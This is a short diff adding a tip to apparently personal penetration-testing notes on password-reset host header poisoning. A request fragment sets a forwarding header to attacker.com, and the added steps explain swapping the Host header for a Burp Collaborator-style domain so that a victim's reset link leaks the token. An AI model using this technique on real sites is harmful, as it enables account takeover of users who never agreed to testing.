@@ -20,3 +20,17 @@ POST /passwordrestlink?token=494949fvjfngf4fg4fg
 host : example.com 
 Host-forwarded-for :  attacker.com
 
+
+
+
+-------------------------------------------------------------------------------------- 
+
+aditya tip 
+
+Capture request of reset password
+Modify host as : host.com.burplink.net
+Forward request from repeater
+Reset link in inbox, Click on it . We’ll get reset token
+
+
+-----------------------------------------------------------------------
